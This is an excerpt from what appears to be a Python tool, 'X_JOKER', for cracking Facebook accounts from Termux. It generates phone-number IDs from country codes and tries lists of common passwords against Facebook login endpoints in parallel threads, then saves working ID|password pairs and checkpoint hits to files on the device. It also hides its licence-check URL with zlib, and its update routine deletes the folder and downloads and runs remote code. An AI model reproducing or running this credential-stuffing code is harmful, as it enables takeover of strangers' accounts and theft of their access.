...
try:
        ...
        os.system('python X_JOKER.py')
except:pass
myid=uuid.uuid4().hex[:5].upper()
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrX_JOKERxxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrX_JOKERxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrX_JOKERxxx-cov', 'r').read()
kex=(f"X_JOKER-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for X_JOKER New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n X_JOKER-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd X_JOKER-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/X_JOKER110/X_JOKER-PRO/main/X_JOKER.py -o X_JOKER.py && python X_JOKER.py")
...
def public():
        ...
        try:
                ...
                try:
                        ...
                        ps_limit =1
                linex()
                print('\033[1;32m exp: Password,Password1122,Password12')
                linex()
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('Afghanking')
                                        plist.append('Password12')
                                        plist.append('Arman12345')
                                        plist.append('Password123')
                                        plist.append('pubgking')
                                        plist.append('Afghanking123')
                                        plist.append('Afghanking786')
                                elif ppp in ['3','03']:
                                        clear()
                                        print(' \033[1;32mWorking password for Password\033[1;37m ')
                                        linex()
                                        print(' [1] Password\n [2] Afghanking\n [3] Password12\n [4] Password124\n [5] pubgking\n [6] first110\n [7] Afghanking123\n [8] Afghanking786\n [9] Afghanking110')
                                        linex()
                                        print('\033[1;32m Out of Password working password\033[1;37m ')
                                        linex()
                                        print(' [1] Password\n [2] Afghanking\n [3] Password124\n [4] Password\n [5] Password12 ')
                                        linex()
                                        print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] Password > best results \n \033[1;32melse\033[1;37m \n [1] Password\n [2] Afghanking\n [3] Password\n [4] Password')
                                        linex()
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/X_JOKER_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/kanokwan.plengien/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                        ...
                        linex()
                        tks = ("Hi X_JOKER Sir, I Need To Buy Your Paid X_JOKER PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python X_JOKER.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0700,0780,0701,070,0783,9370,9378')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as X_JOKER:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','Arman','Armanjan','khan123','afghanistan','khankhan123']
                                X_JOKER.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: muhammad, Arman, Afghan, afghan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: www.gmail, Arman, Afg \033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [X_JOKER-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        X_JOKER=session.cookies.get_dict().keys()
                        if "c_user" in X_JOKER:
                                print('\r\r\033[1;32m [X_JOKER-OK] %s | %s'%(ids,pas))
                                open('/sdcard/X_JOKER-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in X_JOKER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [X_JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/X_JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [X_JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/X_JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[X_JOKER-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [X_JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/X_JOKER-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [X_JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/X_JOKER-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
